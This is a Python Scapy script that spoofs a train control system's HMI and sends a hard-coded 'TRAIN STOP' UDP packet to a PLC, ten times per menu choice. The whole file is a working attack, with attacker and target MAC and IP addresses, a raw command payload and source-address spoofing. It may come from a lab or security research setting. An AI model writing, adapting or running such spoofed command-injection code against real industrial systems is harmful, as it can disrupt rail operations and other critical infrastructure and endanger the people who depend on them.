# -*- coding: utf-8 -*-
import scapy.all as scapy
from scapy.layers.l2 import Ether
from scapy.sendrecv import sendp
from scapy.layers.inet import UDP, IP

# ---------------------------------------
Local_IP = "192.168.3.18"  # Spoofed HMI IP address
Local_MAC = "e4:54:e8:af:c0:11"  # Your attacker's MAC address

HMI_IP = "192.168.3.18"
HMI_MAC = "28:e9:8e:24:bb:e0"

PLC_IP = "192.168.3.39"  # This is the target IP
PLC_MAC = "30:be:3b:8a:1a:f9"
# ---------------------------------------

attack_packet_stop = "5618675505111107e000ffff038911451507c022001c080a08099044368fac30b014022d009547000100ac90000a00732905003780115267450a3e"

def Send_TRAIN_STOP():
    data_off = bytes.fromhex(attack_packet_stop)
    # Spoofing the IP and sending the packet as if it is from HMI
    udpf = Ether(src=Local_MAC, dst=PLC_MAC) / IP(src=HMI_IP, dst=PLC_IP) / UDP(sport=5001, dport=5006) / data_off
    for _ in range(10):
        sendp(udpf, iface="eth0")  # Ensure the interface matches your network setup
    print("TRAIN STOP command sent from spoofed HMI IP\n")

def main():
    while True:
        user_input = input("Enter a number (1:TRAIN STOP (10 packets); Others: Exit):")
        if user_input not in ['1']:
            print("Bye")
            exit(0)
        if user_input == '1':
            Send_TRAIN_STOP()

if __name__ == '__main__':
    main()
